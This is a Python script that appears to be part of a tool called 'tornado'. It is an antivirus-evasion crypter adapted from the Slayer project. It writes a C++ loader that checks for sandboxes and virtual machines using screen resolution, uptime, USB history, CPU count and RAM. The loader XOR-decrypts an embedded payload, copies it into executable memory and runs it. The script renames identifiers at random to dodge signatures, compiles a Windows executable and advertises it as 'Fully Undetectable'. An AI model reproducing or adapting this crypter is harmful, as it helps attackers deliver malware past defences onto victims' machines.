import os
import sys
import time
import random
import shutil
import string
import subprocess
from stem.control import Controller
from colorama import Fore, Back, Style, init
init(autoreset=False)
bblue = Fore.BLUE + Style.BRIGHT
bos = "\033[1;37m"

# this file fully taken from https://github.com/mertdas/Slayer
# thanks for awesome AV Slayer!

def get_random_string():
    length = random.randint(5, 35)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return result_str

def xor(data, key):
    output_str = ""
    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext

def create_template():
    template = open("template.cpp", "w+")
    template.write(
    r'''#include <windows.h>
#include <stdio.h>
#include <iostream>
#define MULTI_LINE_STRING(a) #a
#pragma comment(linker, "/INCREMENTAL:YES")
#pragma comment(lib, "user32.lib")
#define WIN32_LEAN_AND_MEAN
bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
{
	MONITORINFO monitorInfo;
	monitorInfo.cbSize = sizeof(MONITORINFO);
	GetMonitorInfoW(hMonitor, &monitorInfo);
	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
	if (xResolution < 0) xResolution = -xResolution;
	if (yResolution < 0) yResolution = -yResolution;
	if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
		|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
	{
		*((BOOL*)data) = true;
	}
	return true;
}
int main(int argc, char** argv)
{
	MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
	int xResolution = GetSystemMetrics(SM_CXSCREEN);
	int yResolution = GetSystemMetrics(SM_CYSCREEN);
	if ((xResolution < 1000 && yResolution < 1000)){
	        ExitThread(0);
	}else{ 
	
	ULONGLONG uptime = GetTickCount() / 1000;
	if (uptime < 1200) return false;
	HKEY hKey;
	DWORD mountedUSBDevicesCount;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
	RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (mountedUSBDevicesCount < 1) return false;
    
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2) return false;
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048) return false;
		
        unsigned char buf[] = " ";
        char key[] = " ";
        char shellcode[sizeof buf];
        int j = 0;
        for (int i = 0; i < sizeof buf; i++)
        {
            if(j == sizeof key -1 ) j = 0;
            shellcode[i] = buf[i] ^ key[j];
            j++;
        }
        
        void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shellcode, sizeof shellcode);
        ((void(*)())exec)();
        return 0;
       }
}
''')
    template.close()
    
def slayer():
    xorkey = get_random_string()
    buf = get_random_string()
    shellcode = get_random_string()
    monitorinfo = get_random_string()
    systemInfo = get_random_string()
    print(f"{bblue}[*]{bos} Generating code...")
    create_template()
    time.sleep(1)
    print(f"{bblue}[*]{bos} Generating payload...")
    time.sleep(5)
    try:
        plaintext = open("tornado.raw", "rb").read()
    except:
        print(f"{bblue}[*]{bos} Failed to read tornado.raw :(")
        print(f"{bblue}[*]{bos} Missing tornado.raw in pwd?")
        sys.exit(1)
    ciphertext = xor(plaintext, xorkey)
    template = open("template.cpp", "rt")
    data = template.read()
    time.sleep(1)
    data = data.replace('unsigned char buf[] = " ";', "unsigned char buf[] = " + ciphertext + " ")
    data = data.replace('char key[] = " "','char key[] = "' + xorkey + '"')
    data = data.replace("buf", buf)
    data = data.replace("key", xorkey)
    data = data.replace("shellcode", shellcode)
    data = data.replace("monitorInfo", monitorinfo)
    data = data.replace("systemInfo", systemInfo)

    template.close()
    template = open("tornado.cpp", "w+")
    template.write(data)
    time.sleep(1)
    template.close
    
def compile():
    print(f"{bblue}[+]{bos} Compiling...")
    application_name = get_random_string()
    os.system(f"x86_64-w64-mingw32-g++ -o {application_name}.exe tornado.cpp -static-libstdc++ -static-libgcc -mwindows")
    time.sleep(1)

def cya():
    print(f"{bblue}[*]{bos} Fully Undetectable {crypter.application_name}.exe generated :)")